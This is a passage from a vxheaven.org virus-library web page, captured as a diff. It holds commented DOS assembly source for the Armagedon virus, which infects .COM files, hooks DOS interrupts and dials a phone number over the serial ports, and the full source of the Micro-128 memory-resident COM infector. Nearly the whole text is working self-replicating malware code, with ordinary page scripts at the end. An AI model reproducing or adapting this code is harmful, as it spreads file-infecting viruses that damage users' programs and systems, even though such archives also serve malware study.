+		db      2e,0ff,2e,22,01            ;Jump to Int 21 (done)
+;**************************************************************************
+
+
+;****************************************************************************
+;*                             Main Data Section                            *
+;****************************************************************************
+Int_21_Off      dw      138dh
+Int_21_Seg      dw      029a
+
+Int_08_Off      dw      022Bh
+Int_08_Seg      dw      70
+
+Ready_Byte              db      0
+Timing_Counter          db      8
+save_time_a             db      10
+save_time_b             db      9
+save_date               db      34
+Bytes_Written           dw      0
+waste_byte              db      0
+Character_Count         db      0
+Data_Ready              db      0
+Ports_Initialized       db      0 
+
+com             db      'COM'
+handle          dw      5
+file_size       dw      2
+		db      0, 0
+mem_allocated   dw      1301
+save_ss         dw      12AC
+save_sp         dw      0FFFE
+filename_seg    dw      9B70
+filename_off    dw      3D5Bh
+attribs         dw      20
+file_date       dw      0EC2
+file_time       dw      6E68
+		db       0,0,81,0
+cs_save_3       dw      12AC
+		db       5C,0
+cs_save_1       dw      12AC
+		db       6C,0
+cs_save_2       dw      12AC
+;****************************************************************************
+
+Infect:
+		push    ds bx si cx ax dx bp es di  ;Save Registers
+
+		cld                             ;Clear direction
+		push    dx ds                   ;Save Filename Address
+		xor     cx,cx                   ;Zero CX for use as counter
+		mov     si,dx                   ;Move Filename Offset to SI
+
+Find_End_Of_Filename:
+		mov     al,[si]                 ;Get letter from Filename
+		cmp     al,0                    ;Are we at the end of the
+		je      Check_Filename          ;Filename? Yes? Go to loc_7
+		inc     cx                      ;inc Count
+		inc     si                      ;inc pointer to next char
+		jmp     short Find_End_Of_Filename
+
+Check_Filename:
+		add     dx,cx                   ;add filename length to 
+						;start of filename address
+		sub     dx,3                    ;Subtract 3 for extension
+		mov     si,offset com           ;com='COM'
+		mov     di,dx                   ;set di=dx to Check 
+
+						;Next few lines Check for
+						;Command.Com
+
+		cmp     byte ptr [di-3],4E      ;Is the second to last letter 
+						;an 'N'?
+		jne     setup_check             ;If not, it's not COMMAND,
+						;Go to loc_8
+		cmp     byte ptr [di-2],44      ;Is the last letter a 'D'?
+		je      Infect_Error            ;If so, it is COMMAND,
+						;Go to Infect_Error.
+setup_check:
+		mov     cx,3                    ;Setup loop
+
+check_if_com:
+		mov     al,cs:[si]
+		cmp     al,[di]
+		jne     Infect_Error                  
+		inc     si                      ;Check for 'COM' Extension
+		inc     di                      ;If so, infect, otherwise
+		loop    check_if_com            ;Go to Infect_Error
+  
+		pop     ds
+		pop     dx                      ;Restore original filename
+		push    dx                      ;address to DS:DX, then 
+		push    ds                      ;push them back onto stack
+
+		mov     si,dx
+		mov     dl,0
+
+		cmp     byte ptr [si+1],3A      ;Is the second letter a 
+						; ':'? I.E. is the file on
+						;another drive?
+
+		jne     Get_Free_Disk_Space     ;Nope? Go Get_Free_Disk_Space
+
+		mov     dl,[si]                 ;Get drive number if the file
+		and     dl,0F                   ;is on another drive.
+
+Get_Free_Disk_Space:
+		mov     ah,36                   
+		int     21h                     ;Get free drive space. 
+						;DL=drive                                                
+		cmp     ax,0FFFF                
+		je      Infect_Error
+		jmp     short Continue_Infect            
+		nop
+Infect_Error:
+		jmp     Pop_And_Quit_Infect
+		jmp     End_Infect                  
+Error_After_Open:
+		jmp     Close_File
+		jmp     Reset_DTA
+Continue_Infect:
+		cmp     bx,3                    ;If there are less than 3 
+		jb      Infect_Error            ;clusters free, quit.        
+		
+		pop     ds                      ;DS:DX is filename address
+		pop     dx                      ;again.
+		push    ds
+		push    dx
+		
+		mov     word ptr cs:[filename_seg],ds    ;Save DS:DX again
+		mov     word ptr cs:[filename_off],dx
+
+		mov     ax,4300 
+		int     21                         ;Get the file attributes
+					      
+		mov     word ptr cs:[attribs],cx   ;Store attributes
+		mov     ax,4301
+		xor     cx,cx                      ;Set attributes to zero 
+		int     21                         ;to insure write access.
+					 
+		mov     bx,0FFFF
+		mov     ah,48                ;Allocate all free memory
+		int     21                   ;by trying to allocate more 
+					     ;than the computer possibly can,
+		mov     ah,48                ;then using the returned number
+		int     21                   ;(free mem) as the amount to
+					     ;request.
+		
+		mov     word ptr cs:[mem_allocated],ax  ;save the segment of  
+							;allocated memory
+						
+		mov     ax,cs               ;point ds to cs
+		mov     ds,ax
+		mov     dx,offset new_DTA
+		mov     ah,1A                   
+		int     21                  ;Set DTA to memory after virus
+						
+		pop     dx
+		pop     ds
+		mov     ax,3D02 
+		clc                         ;clear carry (unneccessary)
+		int     21                  ;Open file for read/write access
+
+		jc      Error_After_Open        ;on error go to 
+						;Error_After_Open
+		mov     bx,ax                   ;move handle to bx
+		mov     word ptr cs:[handle],ax ;save file handle
+		mov     cx,0FFFF 
+		mov     ax,word ptr cs:[mem_allocated] ;Get segment of 
+						       ;memory to use 
+		mov     ds,ax                   ;point ds to it
+		mov     dx,end_main_virus-start
+		mov     ah,3F                   
+		clc                             ;clear carry
+		int     21                      ;Read 0ffff byte from file
+						
+		jc      Error_After_Open           ;If error go to 
+						   ;Error_After_Open
+		mov     word ptr cs:[file_size],ax ;save file size 
+						   ;(number of bytes read)
+		cmp     ax,0E000                
+		ja      Error_After_Open         ;File is too large, go to 
+						 ;Error_After_Open
+		cmp     ax,end_main_virus-start  ;Is file smaller than virus?
+		jb      Not_Infected             ;Yes, therefore it isn't
+						 ;infected, goto Not_Infected
+		mov     si,offset (end_main_virus+1-100)
+		add     si,si                   ;Set SI to point to area where
+		sub     si,15                   ;the text message would be if
+						;file is already infected.
+		mov     cx,13                   ;Length of Text_Message
+		mov     di,offset Text_Message  ;("Armagedon the GREEK")
+  
+Check_For_Infection:
+		mov     al,byte ptr [si]       ;This loop checks for the text
+		mov     ah,cs:byte ptr [di]    ;message in the file being 
+		cmp     ah,al                  ;examined.  If it's there, it
+		jne     Not_Infected           ;jumps to Close_File, 
+		inc     si                     ;otherwise it jumps to Not_Infected
+		inc     di                     
+		loop    Check_For_Infection
+  
+		jmp     short Close_File            
+		nop
+Not_Infected:
+		mov     ax,4200 
+		mov     bx,word ptr cs:[handle] 
+		xor     cx,cx                   
+		mov     dx,cx
+		int     21                      ;Move to beginning of file
+						
+		jc      Close_File                  
+		mov     si,100
+		mov     cx,offset (end_main_virus-100)
+		xor     di,di                   
+		mov     ax,word ptr cs:[mem_allocated]
+		mov     ds,ax
+  
+Copy_Virus:                                     
+		mov     al,cs:[si]              ;Copy virus onto file in 
+		mov     [di],al                 ;memory. "repnz movsw"
+		inc     si                      ;would've worked a lot 
+		inc     di                      ;better.
+		loop    Copy_Virus
+  
+		mov     ax,5700
+		mov     bx,word ptr cs:[handle] 
+		int     21                      ;Get File Date/Time
+						
+		mov     word ptr cs:[file_time],cx       ;Save File Time
+		mov     word ptr cs:[file_date],dx       ;Save File Date
+		mov     ax,word ptr cs:[mem_allocated] 
+		mov     ds,ax
+		mov     si,offset (end_main_virus-100)
+		mov     al,[si]                      ;encrypt first storage
+		add     al,0Bh                       ;byte.
+		mov     [si],al                      
+		xor     dx,dx                        
+		mov     cx,word ptr cs:[file_size]   ;Calculate new file size           
+		add     cx,offset end_main_virus-100        ;(add virus size)
+		mov     bx,word ptr cs:[handle]
+		mov     ah,40                 
+		int     21                           ;Rewrite file
+					       
+		mov     word ptr cx,cs:[file_time]           
+		mov     word ptr dx,cs:[file_date]           
+		mov     bx,word ptr cs:[handle]
+		mov     ax,5701 
+		int     21                     ;Restore File Time
+					       
+Close_File:
+		mov     bx,word ptr cs:[handle]          
+		mov     ah,3E                  
+		int     21                      ;Close File
+						
+		push    cs
+		pop     ds
+Reset_DTA:
+		mov     dx,80               
+		mov     ah,1A 
+		int     21                     ;Reset DTA to default
+					    
+		mov     ax,word ptr cs:[mem_allocated]          
+		mov     es,ax
+		mov     ah,49                   
+		int     21                      ;Release Allocated Memory
+						
+		mov     ax,word ptr cs:[filename_seg]           
+		mov     ds,ax
+		mov     dx,word ptr cs:[filename_off]           
+		mov     ax,4301 
+		mov     cx,word ptr cs:[attribs]
+		int     21                      ;Restore File Date/Time
+							
+		jmp     short End_Infect            
+		nop
+
+Pop_And_Quit_Infect:
+		pop     ds 
+		pop     dx
+		jmp     short End_Infect
+		nop
+End_Infect:
+		pop     di es bp dx ax cx si bx ds
+		jmp     Go_Int_21
+		
+;************************************************************************  
+;*                      Timer Click (INT 8) Handler                     *
+;*                      This is Used to Dial Numbers                    *
+;************************************************************************
+Int_08:
+		push    bp ds es ax bx cx dx si di
+		
+		pushf                              ;Push flags
+		;call    word ptr cs:[Int_08_Off]  ;Run old timer click
+		db      2e,0ff,1e,26,01
+		
+		call    Timing_Routine
+
+		push    cs
+		pop     ds
+		mov     ah,5
+		mov     ch,byte ptr [save_time_a]
+		cmp     ah,ch
+		ja      Quit_Int_08
+						;if [save_time_a] !=6, quit.
+		mov     ah,6                    
+		cmp     ah,ch
+		jb      Quit_Int_08
+		
+		mov     ah,byte ptr [Ready_Byte]
+		cmp     ah,1
+		je      Go_Dial
+		
+		mov     ah,1
+		mov     byte ptr [Ready_Byte],ah
+		jmp     short Quit_Int_08
+		nop
+
+Go_Dial:
+		call    Write_Ports
+		
+		inc     word ptr [Bytes_Written]
+		mov     ax,word ptr [Bytes_Written]
+		cmp     ax,21C 
+		jne     Quit_Int_08
+		xor     ax,ax                        ;Reset Counters
+		mov     byte ptr [Ready_Byte],ah
+		mov     word ptr [Bytes_Written],ax
+		mov     byte ptr [Data_Ready],ah
+Quit_Int_08:
+		pop     di si dx cx bx ax es ds bp
+		iret
+
+;****************************************************************************  
+;*                          Timing Routine For Dialing                      *    
+;****************************************************************************  
+  
+  
+Timing_Routine:
+		push    cs
+		pop     ds
+
+		xor     al,al     
+		mov     ah,byte ptr [Timing_Counter]
+		cmp     ah,11 
+		jne     Inc_Time_Count                  
+		mov     ah,byte ptr [save_date] 
+		cmp     ah,3bh                  
+		jne     Inc_Saved_Date                  
+		mov     ah,byte ptr [save_time_b]
+		cmp     ah,3bh                  
+		jne     Inc_S_T_B                  
+		mov     ah,byte ptr [save_time_a]
+		cmp     ah,17 
+		jne     Inc_S_T_A       
+		
+		mov     byte ptr [save_time_a],al
+Save_T_B:
+		mov     byte ptr [save_time_b],al
+Store_Save_Date:
+		mov     byte ptr [save_date],al
+Time_Count:
+		mov     byte ptr [Timing_Counter],al
+		ret
+Inc_Time_Count:
+		inc     byte ptr [Timing_Counter]
+		ret
+Inc_Saved_Date:
+		inc     byte ptr [save_date]
+		jmp     short Time_Count
+Inc_S_T_B:
+		inc     byte ptr [save_time_b]
+		jmp     short Store_Save_Date
+Inc_S_T_A:
+		inc     byte ptr [save_time_a]
+		jmp     short Save_T_B
+
+dial_string         db      '+++aTh0m0s7=35dp081,,,,141' ;Dial string To call 
+							 ;Speaking Clock
+							 ;in Greece (Crete)
+  
+;****************************************************************************  
+;*                        Write Data to Com Ports                           *      
+;****************************************************************************  
+
+Write_Ports:
+		mov     al,byte ptr [Data_Ready]
+		cmp     al,1
+		je      Ret_Write_Ports              ; Jump if equal
+		
+		mov     al,byte ptr [Ports_Initialized] ;Have Ports been 
+		cmp     al,1                            ;Initialized yet?
+		je      Already_Initialized
+		
+		mov     cx,3
+Init_Ports:
+		mov     dx,cx                   
+		xor     ah,ah                   
+		mov     al,83                   ;Init Comport
+		int     14                      ;1200 Baud, No Parity,
+						;1 Stop Bit, 8 bit Word Len.
+		loop    Init_Ports              ;Initalize all Ports 1-4
+
+  
+		mov     al,1
+		mov     byte ptr [Ports_Initialized],al
+		
+		jmp     short Ret_Write_Ports        
+		nop
+
+Already_Initialized:
+		push    cs
+		pop     ds
+		mov     si,offset dial_string
+		mov     al,byte ptr [Character_Count]
+		cmp     al,1A 
+		jne     Write_From_SI_To_Ports                  
+		jmp     short Setup_write
+		nop
+
+Write_From_SI_To_Ports:
+		xor     ah,ah
+		add     si,ax
+		mov     al,[si]
+		mov     dx,3F8                  ;Outport from SI to standard
+		out     dx,al                   ;addresses of ports 1-4
+		mov     dx,2F8                  ;and increment character count
+		out     dx,al
+		mov     dx,2E8 
+		out     dx,al
+		mov     dx,3E8 
+		out     dx,al
+		inc     byte ptr [Character_Count]
+		jmp     short Ret_Write_Ports
+		nop
+
+Setup_write:
+		mov     cx,3
+Write_To_All_Ports:
+		mov     dx,cx
+		mov     al,0dh
+		mov     ah,1
+		int     14                      ;Write a 1 to all ports
+		loop    Write_To_All_Ports
+  
+		mov     ax,1
+		mov     byte ptr [Data_Ready],al
+		mov     byte ptr [Character_Count],ah
+		mov     byte ptr [Ports_Initialized],ah
+  
+Ret_Write_Ports:
+		ret
+
+;****************************************************************************
+;                        Virus Entry Point
+;****************************************************************************
+
+Virus_Entry:
+		mov     ah,0e0 
+		int     21                      ;Check for Installation
+		cmp     ax,0dada                ;Was it installed?
+		jne     Install_Virus           ;No? Then install it.
+		jmp     Already_Installed       ;Yes? Go to Already_Installed
+Install_Virus:
+		push    cs
+		pop     ds
+		mov     ax,3521                     ;Get Int 21 Address
+		int     21 
+
+		mov     word ptr [Int_21_Off],bx    ;Save old Int 21 
+		mov     word ptr [Int_21_Seg],es    ;Vector
+		mov     dx,offset Int_21
+		mov     ax,2521 
+		int     21                          ;Set Int 21
+
+		mov     ax,3508 
+		int     21                          ;Get Int 8 Address
+						
+		mov     word ptr [Int_08_Off],bx      
+		mov     word ptr [Int_08_Seg],es    ;Save old Vectors     
+		mov     dx,offset Int_08
+		mov     ax,2508         
+		int     21                          ;Set Int 08
+
+		mov     ah,2C 
+		int     21                          ;Get Time
+						
+		mov     byte ptr [save_time_a],ch
+		mov     byte ptr [save_time_b],cl  ;Save Time and Date
+		mov     byte ptr [save_date],dh
+
+		mov     ax,cs:[2c]              ;Get environment block 
+		mov     ds,ax                   ;address and put it in DS
+		xor     si,si                   ;DS:SI=beginning of Env. B.
+Find_The_Filename:
+		mov     al,[si]                 ;Search through environment
+		cmp     al,1                    ;block for program executed.
+		je      Found_Filename
+		inc     si
+		jmp     short Find_The_Filename
+
+Found_Filename:
+		inc     si
+		inc     si
+		mov     dx,si                 ;DS:DX = Filename
+		mov     ax,cs
+		mov     es,ax                 ;Set segment (ES) = CS  
+		mov     bx,5a                 ;Request 5a0h (1440 dec) bytes
+		mov     ah,4a        
+		int     21                    ;Change Allocated Memory
+				     
+		mov     bx,word ptr cs:[81]   ;Beginning of Command Line
+		mov     ax,cs
+		mov     es,ax                 ;set ES=CS again.
+		mov     word ptr cs:[cs_save_1],ax
+		mov     word ptr cs:[cs_save_2],ax   ;Re-Execute program
+		mov     word ptr cs:[cs_save_3],ax   ;To make Int 27 cause
+		mov     ax,4B00                      ;program to go mem-res   
+		mov     word ptr cs:[save_ss],ss     ;without terminating
+		mov     word ptr cs:[save_sp],sp     ;regular program.
+		pushf                                
+		;call    far cs:[Int_21_Off]         ;Call Load and Execute
+		db      2e,0ff,1e,22,01
+
+		mov     ax,word ptr cs:[save_ss]
+		mov     ss,ax
+		mov     ax,word ptr cs:[save_sp]        ;Restore Stack
+		mov     sp,ax
+		mov     ax,cs
+		mov     ds,ax
+		mov     dx,537                 ;DX=End of virus
+		int     27                     ;Terminate &amp; stay resident
+Already_Installed:
+		mov     ah,0E1                  ;Get CS of virus in memory
+		int     21      
+		mov     si,offset Install_Jump
+		mov     cs:[si+3],ax            ;Setup Jump
+		mov     ax,offset After_Jump
+		mov     cs:[si+1],ax
+		mov     ax,word ptr cs:[file_size]
+		mov     bx,cs
+
+Install_Jump:
+		db      0ea
+IP_For_Jump     db      0,0
+CS_For_Jump     db      0,0
+
+After_Jump:
+		mov     cx,ax  
+		mov     ds,bx
+		mov     si,100
+		mov     di,offset storage_bytes
+
+Restore_File:                       ;Restore File in memory 
+		mov     al,[di]
+		mov     [si],al
+		inc     si
+		inc     di
+		loop    Restore_File
+  
+		mov     si,offset return_jump
+		mov     cs:[si+3],ds              ;set host segment
+		mov     al,byte ptr ds:[100]      ;Get first byte of host,
+		sub     al,0bh                    ;then unencrypt first byte
+		mov     byte ptr ds:[100],al      ;of Storage_Bytes
+		mov     ax,ds                     ;and restore it
+		mov     es,ax                     ;restore ES and SS to point
+		mov     ss,ax                     ;to DS/CS
+
+;*              jmp     far ptr start            ;Return control to COM file
+return_jump:
+		db      0ea
+host_offset     db      00,01
+host_segment    db      07,13
+
+Text_Message    db      'Armagedon the GREEK'
+
+end_main_virus:
+Storage_Bytes   db      0D8,20                    ;First Byte Encrypted
+
+end_of_vir:
+word_space      db      8 dup (?)
+
+new_DTA :
+end     start
+;**************************************************************************
+
+
+
+
+;***************************************************************************
+;*                            Micro-128                                    *
+;***************************************************************************
+;*     The Micro-128 virus was, for a while, the smallest known memory     *
+;*resident non-overwriting .COM infector.  It copies itself onto the       *
+;*interrupt table and hooks Int 21h so that, while in memory, it stores    *
+;*Int 21's address in the Int E0 field.  This allows it to simple call     *
+;*Int E0 when it wants an Int 21h.  While it does have a few nice tricks   *
+;*in it to make it compact, it is a fairly simple virus and is easy to     *
+;*understand.                                                              *
+;*                                                                         *
+;*Note: Micro-128 was originally assembled with an assembler other than    *
+;*      my version of TASM, so to keep the bytes for XOR exactly the same  *
+;*      all XOR's are entered directly, with their assembler commands      * 
+;*      commented out.                                                     *
+;***************************************************************************
+.model  tiny
+.code
+	org     100h
+  
+start:
+		db      0e9h,03h,0              ;Jmp Virus_Entry
+		nop
+		int     20h
+Virus_Entry:
+		mov     di,100h
+		push    di
+		mov     si,di
+		add     si,[di+1]               ;Get offset
+		movsw                           ;Restore Storage Bytes
+		movsb
+
+Copy_Virus:                
+		
+		;xor     ax,ax                   ;Set ES = 0 (Interrupt Table)
+		db       31h, 0c0h
+
+		mov     es,ax
+		mov     di,303h                 ;Space in Int Table
+		mov     cl,7Dh                  ;Virus Size
+		rep     movsb                   ;Copy Virus.
+		scasw                           ;ES:DI = 0?
+		jnz     Done_Install            ;No, Already Installed.
+		std                             ;Set direction flag so that
+						;stosw stores, then decrements
+						;SI and DI.
+
+Hook_Int_21:    
+		xchg    ax,es:[di+0FD04h]       ;DI+FD04h = 86h the first time,
+						;and 84h the second.  These are
+						;Int 21h's Segment and Offset
+						;respectively.
+
+		stosw                           ;Stores old handler to
+						;CS_21 and IP_21.
+
+		mov     ax,33Fh                 ;New offset of Int 21 Handler.
+		cmc                             ;Complement carry
+		jc      Hook_Int_21             ;jump Hook_Int_21
+		
+		cld                             ;Clear direction flag.
+
+Done_Install:
+		push    cs                      ;Return to Host.
+		pop     es
+		ret
+  
+Go_Beginning:
+		mov     al,0                    ;Setup to go from beginning of 
+						;file
+Move_FP:
+		mov     ah,42h                  ;Move File pointer
+		;xor     cx,cx                   ;Zero Segment and Offset,
+		db      31h,0c9h
+
+		;xor     dx,dx                   ;Go to either beginning or end.
+		db      31h,0d2h
+
+		int     0E0h
+		mov     cl,3                     ;Used to make code tighter.
+		mov     dh,3                    
+		retn
+		
+		db      0e9h,03h,0                  ;Jump Inside_21
+
+Int_21_Handler:                
+		cmp     ah,4bh
+Inside_21:
+		jnz     Go_Int_21                   ;Jump if not execute.
+		
+		push    ax bx dx ds                 ;Save registers    
+		
+		mov     ax,3D02h                    ;Open File Read/Write   
+		int     0E0h
+		jc      Close_File
+		mov     bx,ax                       ;Move file handle to BX
+		
+		push    cs
+		pop     ds
+
+		call    Go_Beginning            ;Go to start of file
+		
+		mov     ah,3Fh                  ;DX=300 CX=3
+		int     0E0h                    ;Read 3 bytes from file
+
+		cmp     byte ptr ds:[300h],'M'    ;Is it an .EXE?
+		je      Close_File              ;If so, close.
+
+		dec     ax                      ;AX = 2 (AX = 3 from read)
+		call    Move_FP                 ;Go to end of file.
+		mov     ds:[33dh],ax            ;Save file length
+		
+		mov     ah,40h                  ;Write virus to file
+		mov     cl,80h                  ;128 bytes.
+		int     0E0h                   
+		
+		call    Go_Beginning            ;Go back to the beginning
+		mov     dl,3Ch                  ;and write in jump.
+		mov     ah,40h                  
+		int     0E0h                   
+Close_File:
+		mov     ah,3Eh                  ;Close file
+		int     0E0h                    
+		pop     ds dx bx ax
+
+Go_Int_21:
+	db      0EAh 
+IP_21   dw      ?                               ;When in memory, these are
+CS_21   dw      ?                               ;Located at the entry for
+						;Int E0h, making any call to
+						;that interrupt go to INT 21h.
+end     start
+;***************************************************************************
+</pre>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vbw05">Back to index</a>] [<a href="/lib/vbw05.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vbw05">de</a><a href="/lib/index.php?lang=en&amp;id=vbw05">en</a><a href="/lib/index.php?lang=es&amp;id=vbw05">es</a><a href="/lib/index.php?lang=it&amp;id=vbw05">it</a><a href="/lib/index.php?lang=fr&amp;id=vbw05">fr</a><a href="/lib/index.php?lang=pl&amp;id=vbw05">pl</a><a href="/lib/index.php?lang=ru&amp;id=vbw05">ru</a><a href="/lib/index.php?lang=ua&amp;id=vbw05">ua</a></div>
+</body>
+</html>
